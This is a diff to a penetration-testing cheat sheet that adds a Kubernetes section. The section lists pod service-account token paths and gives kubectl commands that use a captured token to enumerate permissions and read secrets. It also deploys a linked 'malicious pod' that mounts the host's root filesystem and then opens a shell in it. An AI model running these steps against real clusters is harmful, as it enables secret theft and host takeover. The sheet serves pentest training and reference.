@@ -6,6 +6,7 @@
 ---
 
 - [AWS](#aws)
+- [Kubernetes](#kubernetes)
 
 # AWS
 ### Configure
@@ -63,3 +64,82 @@ aws --endpoint-url http://localhost:4566 dynamodb create-table --table-name exam
 aws --endpoint-url http://localhost:4566 dynamodb put-item --table-name example \
   --item '{"example_attribute":{"S":"Example"}}'
 ```
+
+# Kubernetes
+
+> Kubernetes commonly stylized as K8s is an open-source container orchestration system for automating software deployment, scaling, and management. Google originally designed Kubernetes, but the Cloud Native Computing Foundation now maintains the project. 
+
+### Usefull paths
+
+
+```
+/run/secrets/kubernetes.io/serviceaccount/ca.crt
+/run/secrets/kubernetes.io/serviceaccount/namespace
+/run/secrets/kubernetes.io/serviceaccount/token
+
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+/var/run/secrets/kubernetes.io/serviceaccount/namespace
+/var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+### Namespace
+
+```
+kubectl get namespace --server <HOST> --certificate-authority=ca.crt --token=$token
+```
+
+### Authorization
+
+```
+kubectl auth can-i --list --namespace=<NAMESPACES> --server <HOST> --certificate-authority=ca.crt --token=$token
+```
+
+### Secrets
+
+List all secrets:
+```
+kubectl get secrets --namespace=<NAMESPACES> --server <HOST> --certificate-authority=ca.crt --token=$token
+```
+
+Get secret:
+
+```
+kubectl describe secret <SECRET-ID> --namespace=<NAMESPACE> --server <HOST> --certificate-authority=ca.crt --token=$token
+```
+
+### Pods
+
+Get:
+
+```
+kubectl --namespace=<NAMESPACE> --server <HOST> --certificate-authority=ca.crt --token=$token get pods
+```
+
+Describe:
+
+You can get configuration of specific
+```
+kubectl --namespace=<NAMESPACE> --server <HOST> --certificate-authority=ca.crt --token=$token describe pod <POD_ID>
+```
+
+Apply:
+
+If you have good rights to apply a pod, most of the time you will be able to turn up the volume of the root machine.
+
+You can find an definition of malicious pod here: [pwn.yml](https://github.com/sawyerf/HackSheet/scripts/pwn.yml)
+
+```
+kubectl --namespace=<NAMESPACE> --server <HOST> --certificate-authority=ca.crt --token=$token apply -f pwn.yml
+```
+
+### Exec command
+
+```
+kubectl --namespace=<NAMESPACE> --server <HOST> --certificate-authority=ca.crt --token=$token exec -it pwn -- bash
+```
+
+### Usefull link
+
+- [Kubernetes Methodology 1](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
+- [Kubernetes Methodology 2](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2)
+- [Pods PE](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
